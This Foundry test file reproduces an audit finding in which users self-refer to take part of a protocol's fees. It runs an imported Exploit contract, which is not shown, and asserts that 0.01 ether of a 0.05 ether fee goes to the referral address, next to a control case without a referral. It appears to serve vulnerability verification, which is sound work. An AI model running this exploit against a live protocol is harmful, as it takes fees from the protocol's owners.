// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import "forge-std/Test.sol";
import {Exploit} from "./45971-h-01-users-can-steal-part-of-protocol-fees-through-referrals.sol";
contract Finding45971Test is Test {
    function test_exploit_self_referral_takes_protocol_cut() public {
        vm.deal(address(this), 2 ether);
        Exploit e = new Exploit();
        e.run{value: 1 ether}();
        assertEq(address(e.referral()).balance, 0.01 ether, "referral");
        assertEq(address(e.treasury()).balance, 0.04 ether, "treasury");
    }
    function test_control_no_referral_pays_full_protocol_fee() public {
        vm.deal(address(this), 2 ether);
        Exploit e = new Exploit();
        e.passes().buyPasses{value: 1 ether}(address(e.manager()), 1, 100, address(0));
        assertEq(address(e.referral()).balance, 0, "no referral");
        assertEq(address(e.treasury()).balance, 0.05 ether, "full protocol fee");
    }
}
